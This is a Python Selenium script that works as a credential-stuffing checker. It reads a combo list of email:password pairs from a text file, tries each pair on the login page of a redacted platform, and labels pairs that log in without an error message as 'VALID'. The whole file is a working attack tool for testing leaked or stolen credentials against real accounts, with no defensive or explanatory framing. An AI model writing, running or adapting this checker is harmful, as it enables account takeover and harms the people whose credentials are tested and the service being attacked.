import time
from time import sleep
import re
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
#from selenium.webdriver.chrome.options import Options
#from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait


status = False
#opening combo list
def openfile():
    try:
        with open("xxxxxx_brz.txt" , errors="replace" ) as opened_f:
            f = opened_f.read()
            opened_f.close()

            list_f = f.replace("\n",",").split(',')
            return list_f
    except:
        print(Exception, """OOPS.. AN ERROR OCCURRED 
                                TRY THESE TO TROUBLESHOOT:
                                * Verify Your File or Folder PATH if its correct
                                * Verify your File or Folder name
                                * Verify your File Type (.txt)
                                * IF NOTHING WORKED THEN YOU ARE FUCKED
                                """)



#Function for chrome instance with each mail/pass


def inst(mail ,mdp ):

        service = Service(executable_path="chromedriver.exe")
        driver = webdriver.Chrome(service=service)
        driver.get('https://plateforme.xxx.com')


        input_element = driver.find_element(By.TAG_NAME, "input")
        input_element.send_keys(mail + Keys.ENTER)
        sleep(1)

        WebDriverWait(driver, 2).until(
            EC.presence_of_element_located((By.NAME, "password"))
        )
        input_element = driver.find_element(By.NAME, "password")
        input_element.send_keys(mdp + Keys.ENTER)

        #keycheck script
        try:
            sleep(2)
            driver.find_element(By.CLASS_NAME, "err-msg")#key word HTML err-msg
            driver.quit()
            return True

        except:
            driver.quit()
            return Exception








combos = openfile()
for combo in combos:
    try:
        #valid email checker
        def is_valid_email(email):
            pattern = r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)"
            return re.match(pattern, email) is not None


        s_combo = combo.split(':')
        email = s_combo[0]
        mdp = s_combo[1]

        if is_valid_email(email):
            if inst(email,mdp ) is True :
                print(combo)
            else:
                print(combo , "                                     VALID")


    except:
        ''

